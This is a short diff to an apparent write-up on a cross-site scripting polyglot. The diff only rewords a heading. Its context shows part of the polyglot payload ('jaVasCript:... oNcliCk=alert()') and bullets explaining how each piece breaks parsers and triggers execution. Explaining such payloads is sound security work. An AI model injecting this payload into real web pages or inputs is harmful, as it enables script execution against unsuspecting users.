@@ -14,7 +14,7 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</
 
 ```
 
-## Anatomy of the polyglot (briefly):
+## Anatomy of the polyglot (in a nutshell):
 * `jaVasCript:`: A label in ECMAScript; a URI scheme otherwise.
 * ```/*-/*`/*\`/*'/*"/**/```: A multi-line comment in ECMAScript; a literal-breaker sequence.
 * `(/* */oNcliCk=alert() )`: A tangled execution zone wrapped in invoking parenthesis!
